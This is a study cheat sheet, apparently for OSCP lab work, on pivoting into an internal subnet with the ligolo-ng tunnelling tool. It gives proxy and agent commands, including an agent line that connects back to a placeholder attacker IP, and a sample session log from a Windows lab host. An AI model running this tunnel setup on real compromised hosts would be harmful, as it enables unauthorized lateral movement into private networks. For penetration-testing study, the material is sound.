
#### Setting up
Creating the `ligolo` network device:
```
sudo ip tuntap add user CURRENT_USERNAME mode tun ligolo
sudo ip link set ligolo up
```

#### Starting the proxy (attacker machine)
```
./proxy -selfcert
```

#### Starting the agent (target machines)
```
ligolo-agent.exe -connect ATTACKER_IP:ATTACKER_PORT -ignore-cert
```

#### Adding the target IP route to the `ligolo` Networking device
Get the subnet from Ligolo: `Sessions --> select session --> ifconfig`. Make sure to replace the last octet with a `0`
```
ip route add SUBNET/24 dev ligolo
```
If the error message `Error: Invalid prefix for given prefix length.` pops up, set the last octet to `0`.
Cleaning up:
```
ip route del SUBNET/24
```


##### Example: Windows target
```
┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!

ligolo-ng » INFO[0010] Agent joined.                                 name="MULTISERVER03\\rdp_admin@MULTISERVER03" remote="192.168.171.64:56242"
ligolo-ng » session
? Specify a session : 1 - #1 - MULTISERVER03\rdp_admin@MULTISERVER03 - 192.168.171.64:56242
[Agent : MULTISERVER03\rdp_admin@MULTISERVER03] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:9e:9e:e7              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::80af:e261:645f:a8f/64    │
│ IPv4 Address │ 192.168.171.64/24              │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:9e:54:7e              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv6 Address │ fe80::41f2:e449:cbf7:4b1e/64   │
│ IPv4 Address │ 10.4.171.64/24                 │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
[Agent : MULTISERVER03\rdp_admin@MULTISERVER03] »  

// Another terminal
┌─[✗]─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #ip route add 10.4.171.0/24 dev ligolo

// Back to the session

```